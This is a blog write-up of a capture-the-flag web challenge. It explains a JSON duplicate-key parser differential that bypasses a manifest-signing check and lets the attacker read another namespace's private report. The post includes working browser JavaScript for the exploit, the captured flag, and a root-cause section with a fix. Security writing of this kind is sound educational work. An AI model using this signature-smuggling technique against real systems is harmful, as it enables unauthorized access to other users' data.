---
title: "Two Parsers, One JSON and a Flag: Intigriti's July 2026 Challenge"
date: 2026-08-04
author: Himanshu Anand
tags: [ctf, web-security, json, parser-differential, intigriti]
draft: false
---

# Two Parsers, One JSON, and a Flag

Intigriti's July challenge is called **"Canonically Yours"** and the whole bug is one silly question: what happens when you put the same key in a JSON object twice? Turns out two different bits of code answer that differently and that gap give you the flag.


```
INTIGRITI{019f8700-4613-74fb-923e-781903e4bee9}
```

![The challenge landing page](https://blog.himanshuanand.com/images/blog-01-landing.png)

## The app

Its a mini package registry called **Registry Observatory**. You register you get a private namespace like `haxn1ke0ucd-36e784ea` and you can generate signed "compatibility reports" for packages you own. The flag lives in a report for a package you do **not** own.

![The app, asking us to make an account](https://blog.himanshuanand.com/images/blog-02-app-register.png)

A quick read of the app "Observatory archive" endpoints tells you the target for free: there is a `security-notes` package in platform scope called `core` the treasure is `@core/security-notes`.

## Normal workflow

1. Build a small JSON "manifest" describing the package.
2. Base64 it and send it to `POST /api/manifests/sign`. The server checks it and, if it likes it, signs it.
3. Send the same manifest plus the approval to `POST /api/publications`.
4. Read the report at `GET /api/publications/<id>`.

The manifest looks like this:

```json
{
  "package":  { "scope": "haxn1ke0ucd-36e784ea", "name": "hello-world", "version": "1.0.0" },
  "metadata": { "description": "Compatibility check", "visibility": "private" },
  "operation": "preflight"
}
```

The sign step is the bouncer It only signs manifests for packages you actually own swapping `scope` to `core` gets you a flat `"Manifest could not be approved."`

![The Manifest Studio, where the signing happens](https://blog.himanshuanand.com/images/blog-04-manifest-studio.png)

## Trick

The title says it: **canonicalization** it kinda mostly means two pieces of code read the same input differently. The reproduction steps even mention your namespace going in the **"first"** package object which means there can be a second one.

So send the `package` key **twice**:

```json
{
  "package": { "scope": "haxn1ke0ucd-36e784ea", "name": "hello-world", "version": "1.0.0" },
  "package": { "scope": "core", "name": "security-notes", "version": "1.0.0" },
  "metadata": { "description": "x", "visibility": "private" },
  "operation": "preflight"
}
```

The bet: the **signer** reads the **first** `package` (mine, so it approves) and the **report generator** reads the **last** `package` (`@core/security-notes` it builds that report). Same bytes, two readers with two answers.

you cannot use `JSON.stringify`, it silently drops the duplicate key, So You have to build the raw JSON as a plain string and Base64 that yourself.

```js
const me = await (await fetch('/api/me', {credentials:'same-origin'})).json();
const csrf = me.csrf_token, ns = me.user.namespace;
const b64 = s => { const d = new TextEncoder().encode(s); let m=''; d.forEach(c=>m+=String.fromCharCode(c)); return btoa(m); };
const call = (p, body) => fetch('/api'+p, { method:'POST', headers:{'content-type':'application/json','x-csrf-token':csrf}, credentials:'same-origin', body:JSON.stringify(body) }).then(r=>r.json());

const manifest =
`{
  "package": { "scope": "${ns}", "name": "hello-world", "version": "1.0.0" },
  "package": { "scope": "core", "name": "security-notes", "version": "1.0.0" },
  "metadata": { "description": "x", "visibility": "private" },
  "operation": "preflight"
}`;
const mb64 = b64(manifest);

const sign = await call('/manifests/sign', { manifest_b64: mb64 });
const pub  = await call('/publications', { manifest_b64: mb64, ...sign });
const report = await (await fetch('/api/publications/'+pub.publication_id, {credentials:'same-origin'})).json();
console.log(report);
```

The sign step returns `201`, the report comes back for `@core/security-notes` and its release notes are the flag.

![The report for @core/security-notes with the flag](https://blog.himanshuanand.com/images/blog-03-flag-report.png)

## My Failed attempts (the useful part)

Two quick dead ends that pin down exactly how the bug works: putting `core` **first** gets rejected at signing (the bouncer reads the first key and bounces you) and duplicating `scope` **inside** one package object also fails the two parsers split at the `package` level not deeper.

## The root cause

The same signed blob was read by two JSON parsers that disagree on duplicate keys. One kept the first value and the other kept the last. The signature was valid it just covered the wrong half of the message. This class of bug is a **parser differential** (JSON duplicate-key confusion) and it has caused real auth bypasses and signature-smuggling in the wild. The fix is boring: use one parser, reject duplicate keys instead of guessing and act on the exact bytes you signed.

Thanks to Intigriti and [@silent_web3_](https://x.com/silent_web3_) for a clever one. Go read your JSON parsers, they might not agree with each other.
